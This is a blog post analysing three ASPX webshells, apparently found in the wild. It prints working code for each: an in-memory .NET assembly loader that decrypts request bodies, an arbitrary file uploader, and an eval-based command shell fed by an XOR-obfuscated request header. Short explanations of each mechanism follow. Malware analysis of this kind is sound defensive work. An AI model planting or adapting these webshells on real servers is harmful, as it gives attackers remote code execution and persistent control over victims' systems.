---
layout: post
title:  "ASPX Webshells analysis"
---
While the origin of the specific webshell I’ll be discussing remains unknown, its impact and functionality are worth exploring. In this blog, we’ll unravel the inner workings of this enigmatic tool, examining its potential applications, risks, and countermeasures. So, join me as we embark on an illuminating journey into the depths of an ASPX webshell, its origins shrouded in secrecy.
The analyzed webshells consist of the following: 



# IP.aspx

```c
*byte[] c=Request.BinaryRead(Request.ContentLength);*

*string asname=System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79});//System.Reflection.Assembly*

*Type assembly=Type.GetType(asname);*

*MethodInfo load = assembly.GetMethod("Load",new Type[] {new byte[0].GetType()});*

*object obj=load.Invoke(null, new object[]{Decrypt(c)});*

*MethodInfo create = assembly.GetMethod("CreateInstance",new Type[] { "".GetType()});*

*string name = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 }); //U*

*object pay=create.Invoke(obj,new object[] { name });*

*pay.Equals(this);*
```

When the request is received, the binary in the request is read to memory, then it is decrypted with AES ECB algorithm, and the Load method of *System.Reflection.Assembly* is called to load the .NET binary in memory. After loading the binary, the *CreateInstance* method is called to get the binary instance, and finally, the “Equals” method is called from the binary.

# SC.aspx

```c
String filePath = String.IsNullOrEmpty(Request["filePath"])?Request.ServerVariables["APPL_PHYSICAL_PATH"]:Request["filePath"];

if(Request.Files.AllKeys.Length > 0){

foreach (string fileString in Request.Files.AllKeys){

HttpPostedFile file = Request.Files[fileString];

file.SaveAs(filePath + file.FileName);

Response.Write(filePath + file.FileName);

}

}else{

Response.Write(string.Format("<form action='' method='post' enctype='multipart/form-data'><input name='filePath' type='text' value='{0}' /><input name='file' type='file' /><input type='submit' value='submit'></form>",filePath));

}

%>
```

The websshell reads a list of file from the request and writ them to the machine in a specific path.

# MSCV.aspx

```c
*function xor(str)*

*{*

*var key = "cc17c30cd111c7215fc8f51f8790e0e1";*

*var ins = [];*

*for(var x=0;x<str.length;x++)*

*{*

*ins[x] = str[x] ^ key[x%32];*

*}*

*return ins;*

*}*

*function tt(str)*

*{*

*var c = str.ToCharArray();*

*var l = str.length;*

*var r = "";*

*for (var i = 0; i < l ; i++)*

*{*

*r = r + c[l - i - 1];*

*}*

*var eee = xor(System.Convert.FromBase64String(r));*

*return eee;*

*}*

*function un(str,rrr)*

*{*

*return "" + eval(System.Text.Encoding.GetEncoding("UTF-8").GetString(tt(Request.Item["ceshi"].substr(22))),str+rrr);*

*}*

*un('uns',"afe");*

*%>*
```

The payload is in in the header item “ceshi”. The payload starts at offset 22, it is read and passed to the “tt” function. The string is first reversed, then it is decoded using base64, and finally the xor function is called to decrypt the bytes and get the command to run in eval function to execute the command.